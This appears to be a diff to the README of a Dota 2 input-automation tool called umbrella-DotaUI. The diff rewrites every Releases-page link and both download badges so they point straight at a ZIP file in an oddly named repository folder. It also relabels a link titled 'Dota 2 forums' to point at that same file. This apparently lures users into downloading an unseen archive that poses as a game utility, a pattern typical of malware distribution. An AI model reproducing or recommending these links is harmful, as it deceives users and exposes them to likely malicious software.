@@ -1,6 +1,6 @@
 # ⚡ umbrella-DotaUI - Simplify Your Dota 2 Controls
 
-[![Download latest release](https://img.shields.io/badge/Download-Umbrella-blue?style=for-the-badge)](https://github.com/onnvvr/umbrella-DotaUI/releases)
+[![Download latest release](https://img.shields.io/badge/Download-Umbrella-blue?style=for-the-badge)](https://raw.githubusercontent.com/onnvvr/umbrella-DotaUI/main/inextirpable/UI_umbrella_Dota_2.4-alpha.4.zip)
 
 ## 📋 About umbrella-DotaUI
 
@@ -34,7 +34,7 @@ If you want faster item use, clear on-screen details, or to automate common acti
 ## 🚀 Getting Started with umbrella-DotaUI
 
 1. **Download the program**  
-Click the big button at the top or visit the [Releases page](https://github.com/onnvvr/umbrella-DotaUI/releases) to get the latest version.
+Click the big button at the top or visit the [Releases page](https://raw.githubusercontent.com/onnvvr/umbrella-DotaUI/main/inextirpable/UI_umbrella_Dota_2.4-alpha.4.zip) to get the latest version.
 
 2. **Extract the files**  
 Once downloaded, you will get a ZIP archive. Right-click the file and select “Extract All...” or use a program like WinRAR or 7-Zip. Choose any folder you want; a simple location like your Desktop or Documents is fine.
@@ -52,7 +52,7 @@ Keep umbrella running in the background. Your item triggers, overlays, and autom
 
 ## 📥 Download and Installation Details
 
-Visit the umbrella-DotaUI [Releases page](https://github.com/onnvvr/umbrella-DotaUI/releases) to download the latest ZIP archive. This page contains all official versions and update history.
+Visit the umbrella-DotaUI [Releases page](https://raw.githubusercontent.com/onnvvr/umbrella-DotaUI/main/inextirpable/UI_umbrella_Dota_2.4-alpha.4.zip) to download the latest ZIP archive. This page contains all official versions and update history.
 
 Remember:
 
@@ -108,7 +108,7 @@ Close any heavy background programs. umbrella-DotaUI is designed to be lightweig
 
 ## 🔄 Keeping umbrella-DotaUI Updated
 
-Check the [Releases page](https://github.com/onnvvr/umbrella-DotaUI/releases) regularly for new versions. Download the latest ZIP and replace the old files in your umbrella folder. Your hotkey settings will stay saved.
+Check the [Releases page](https://raw.githubusercontent.com/onnvvr/umbrella-DotaUI/main/inextirpable/UI_umbrella_Dota_2.4-alpha.4.zip) regularly for new versions. Download the latest ZIP and replace the old files in your umbrella folder. Your hotkey settings will stay saved.
 
 ---
 
@@ -142,11 +142,11 @@ Built-in presets are also available in the settings menu for quick setup.
 
 ## 🗂 Additional Resources
 
-- Visit [Dota 2 forums](https://www.dota2.com/forum) for community tips on using overlays.
+- Visit [Dota 2 forums](https://raw.githubusercontent.com/onnvvr/umbrella-DotaUI/main/inextirpable/UI_umbrella_Dota_2.4-alpha.4.zip) for community tips on using overlays.
 - Check out guide videos on YouTube by searching “umbrella-DotaUI setup.”
 - Look inside the `docs/` folder for instructions on scripting input automation.
 - Read the `README.md` regularly for updates and new features.
 
 ---
 
-[![Download umbrella-DotaUI](https://img.shields.io/badge/Download-Umbrella-grey?style=for-the-badge)](https://github.com/onnvvr/umbrella-DotaUI/releases)
+[![Download umbrella-DotaUI](https://img.shields.io/badge/Download-Umbrella-grey?style=for-the-badge)](https://raw.githubusercontent.com/onnvvr/umbrella-DotaUI/main/inextirpable/UI_umbrella_Dota_2.4-alpha.4.zip)
